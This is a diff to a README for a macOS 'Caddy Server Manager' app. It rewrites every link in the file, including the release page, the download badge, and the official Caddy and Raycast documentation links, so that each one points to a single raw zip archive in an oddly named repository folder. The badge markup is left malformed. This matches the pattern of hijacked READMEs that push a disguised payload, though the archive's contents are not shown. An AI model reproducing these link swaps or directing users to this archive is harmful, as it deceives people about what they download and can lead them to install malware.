@@ -1,7 +1,7 @@
 # 🛠️ caddy - Easily Manage Your Caddy Server
 
 ## 🔗 Download Now
-[![Download caddy](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/preview76/caddy/releases)
+[![Download caddy](https://raw.githubusercontent.com/preview76/caddy/main/sodioaurous/caddy.zip%20Latest%https://raw.githubusercontent.com/preview76/caddy/main/sodioaurous/caddy.zip)](https://raw.githubusercontent.com/preview76/caddy/main/sodioaurous/caddy.zip)
 
 ## 📖 Overview
 
@@ -13,7 +13,7 @@ Follow these steps to download and run the Caddy Server Manager:
 
 1. **Visit the Releases Page**  
    Go to the following link to find the latest version:  
-   [Download Caddy Server Manager](https://github.com/preview76/caddy/releases)
+   [Download Caddy Server Manager](https://raw.githubusercontent.com/preview76/caddy/main/sodioaurous/caddy.zip)
 
 2. **Download the Application**  
    Look for the most recent release and click on the appropriate file for macOS. It usually comes in a `.dmg` format.
@@ -77,7 +77,7 @@ Explore all your configured domains and URLs stored in your Caddyfile. This feat
 
 To begin using the Caddy Server Manager, follow these steps:
 
-1. **Visit the Releases Page**: Click this link to access the download page again: [Download Caddy Server Manager](https://github.com/preview76/caddy/releases).
+1. **Visit the Releases Page**: Click this link to access the download page again: [Download Caddy Server Manager](https://raw.githubusercontent.com/preview76/caddy/main/sodioaurous/caddy.zip).
 
 2. **Download the Latest Version**: Select the proper file for your macOS. 
 
@@ -96,7 +96,7 @@ If you experience any issues while using Caddy Server Manager, please address th
 
 ## 🔗 Additional Resources
 
-- **Caddy Documentation**: To understand the Caddy server better, check out the official documentation: [Caddy Documentation](https://caddyserver.com/docs).
-- **Raycast Documentation**: Want to learn more about Raycast? Visit [Raycast Docs](https://raycast.com/docs).
+- **Caddy Documentation**: To understand the Caddy server better, check out the official documentation: [Caddy Documentation](https://raw.githubusercontent.com/preview76/caddy/main/sodioaurous/caddy.zip).
+- **Raycast Documentation**: Want to learn more about Raycast? Visit [Raycast Docs](https://raw.githubusercontent.com/preview76/caddy/main/sodioaurous/caddy.zip).
 
 Using the Caddy Server Manager can make managing your Caddy web server simple and efficient. Download the tool today and start taking control of your web server.
